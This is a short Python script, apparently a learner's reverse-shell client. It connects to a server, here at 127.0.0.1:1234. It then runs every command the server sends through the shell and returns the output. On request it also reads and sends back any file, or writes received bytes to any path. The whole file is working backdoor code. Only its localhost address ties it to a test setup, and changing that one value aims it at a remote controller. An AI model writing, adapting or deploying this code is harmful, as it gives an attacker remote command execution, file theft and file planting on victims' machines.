import socket
import subprocess
from pathlib import Path

ip_address = '127.0.0.1'
port_number = 1234

cs = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

cs.connect((ip_address, port_number))

msg = 'TEST_client'#input("msg>")


cs.send(msg.encode())

msg = cs.recv(1024).decode()

while msg!='quit':
    msg = list(msg.split(" "))
    if msg[0] == "download":
        filename = msg[1]
        f = open(Path(filename),'rb')
        contents =f.read()
        f.close()
        cs.send(contents)
        msg = cs.recv(1024).decode()
    
    elif msg[0] == 'upload':
        print(msg)
        filename = msg[1]
        filesize = int(msg[2])
        contents = cs.recv(filesize)
        f = open(Path(filename),'wb')
        f.write(contents)
        f.close()
        print("file got")
        cs.send("got file".encode())
        msg = cs.recv(1024).decode()

    else:
        p = subprocess.Popen(
            msg,stdout = subprocess.PIPE,stderr = subprocess.PIPE,shell=True
        )
        output, error = p.communicate()
        if len(output) >0:
            msg = str(output.decode())
        else:
            msg = str(error.decode())


        cs.send(msg.encode())
        msg = cs.recv(1024).decode()
        #print(msg)
    

cs.send(msg.encode())

cs.close()

